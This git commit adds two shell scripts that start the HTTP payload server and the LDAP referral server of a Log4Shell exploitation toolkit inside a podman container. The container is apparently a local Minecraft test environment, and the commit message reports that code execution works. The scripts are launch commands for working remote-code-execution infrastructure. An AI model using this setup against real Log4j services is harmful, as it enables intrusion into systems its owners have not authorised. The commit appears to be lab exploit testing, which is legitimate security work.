1866c48e00333de0909cb4dee52a977eff21aef4
Simon Jöhnk <Simon.joehnk@t-online.de>
2026-08-18 20:38:23 +0200

    fix routing, code exec works, but not expected result

---
+++ log4shelltools/run-http-container.sh
@@ -0,0 +1,1 @@
+podman exec log4shell_mc_1 bash -c "cd /log4shelltools/scripts && java -cp ../log4shelltools.jar xyz.terriblefriends.log4shelltools.HTTPServer 8000"
---
+++ log4shelltools/run-ldap-container.sh
@@ -0,0 +1,1 @@
+podman exec log4shell_mc_1 bash -c "cd /log4shelltools && java -cp log4shelltools.jar xyz.terriblefriends.log4shelltools.LDAPServer http://127.0.0.1:8000/ 1389"
